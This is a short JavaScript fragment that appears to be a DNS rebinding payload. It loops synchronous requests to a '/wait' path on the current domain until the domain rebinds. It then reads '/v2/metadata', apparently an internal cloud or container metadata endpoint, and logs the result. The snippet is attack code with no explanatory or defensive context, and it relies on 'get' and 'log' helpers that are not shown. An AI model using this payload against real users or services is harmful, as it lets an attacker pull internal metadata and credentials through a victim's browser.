var meta;
for(var i = 0; i < 600; ++i) {
    var req = new XMLHttpRequest();
    req.open('GET', 'http://' + document.domain + '/wait', false);
    req.send();
    meta = get('http://' + document.domain + '/v2/metadata');
    if(meta != 'still the same host')
    	break;
}
log('Meta: ' + meta);
